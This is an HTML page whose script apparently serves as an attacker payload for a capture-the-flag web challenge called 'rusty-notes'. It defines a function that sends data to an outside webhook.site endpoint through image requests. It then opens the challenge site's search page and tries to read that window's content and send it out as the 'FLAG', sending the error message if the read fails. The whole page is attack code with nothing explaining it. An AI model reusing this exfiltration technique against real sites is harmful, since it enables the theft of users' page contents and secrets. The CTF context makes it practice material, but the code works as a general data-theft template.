<!DOCTYPE html>
<html>
<body>
<script>
const WEBHOOK = 'https://webhook.site/0be31e8c-48c3-42e1-bd43-37ec46b220b0';

function exfil(data, label) {
    new Image().src = `${WEBHOOK}/${label}?d=${encodeURIComponent(JSON.stringify(data))}`;
}

exfil({test: 'arrived'}, 'start');

setTimeout(() => {
    const win = window.open('https://rusty-notes.ctf-bsides-algiers-2k25.shellmates.club/search?query=shellmates', '_blank');
    
    setTimeout(() => {
        try {
            // Try to read the opened window (will fail due to same-origin policy)
            const content = win.document.body.innerHTML;
            exfil({content}, 'FLAG');
        } catch(e) {
            exfil({error: e.message}, 'fail');
        }
    }, 5000);
}, 1000);
</script>
</body>
</html>
